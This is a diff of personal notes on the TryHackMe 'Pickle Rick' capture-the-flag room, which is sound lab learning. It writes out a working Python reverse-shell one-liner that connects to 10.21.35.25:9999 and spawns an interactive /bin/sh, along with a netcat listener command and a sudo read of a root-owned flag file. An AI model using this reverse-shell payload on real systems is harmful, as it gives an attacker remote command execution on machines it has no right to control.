@@ -19,7 +19,7 @@ https://medium.com/@matheidemann/pickle-rick-ctf-writeup-full-and-detailed-tryha
 https://www.youtube.com/watch?v=oCAtfcr3iUw&list=PL1H1sBF1VAKUOm3WyiZ-m2Oqwku4Xp6if&index=5
 
    
-export IP=10.10.43.168
+export IP=10.10.22.86
 ping $IP
  
    
@@ -140,27 +140,34 @@ run  sudo   nl  /root/3rd.txt
 -----------------------------------------------------------
 
 
-------------------   Another war using python.  -------------------
+------------------   Another war using python. ( reverse shall) -------------------
 
 try to run in the command line the commaand 
  python3 -c "print('Hello')"
- if the result is "hello"   then you can run python in the system
+ if the result is "hello"   then you can run python in the system.
  
  
  reverse shall
  ==================
-https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet 
+ gotothe webpage of  'pentestmonkey':
+       https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet 
  in python section you will find this script for reverse shall
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.21.35.25",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+python3 -c 'import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("10.21.35.25",9999));os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1); 
+os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);'
 
  
-Change the IP   to your TryHackMe VPN  ifconfig tun0 interface IP address.
+Change the IP   to your TryHackMe VPN  ifconfig tun0 interface IP address. (10.21.35.25)
+
+or run     'ip addr show tun0'
 copy it to the command line
  use Netcat on our machine and listen on the  port 9999
  in terminal run:  nc   -lvnp  9999
  and execute the script in the command line
 
- 
- 
-https://youtu.be/oCAtfcr3iUw?list=PL1H1sBF1VAKUOm3WyiZ-m2Oqwku4Xp6if&t=703
-https://medium.com/@matheidemann/pickle-rick-ctf-writeup-full-and-detailed-tryhackme-fcd88a5400e3
+Now you can run commands in the remote host
+
+ next you sould upload your reverse shal  to the remote host 
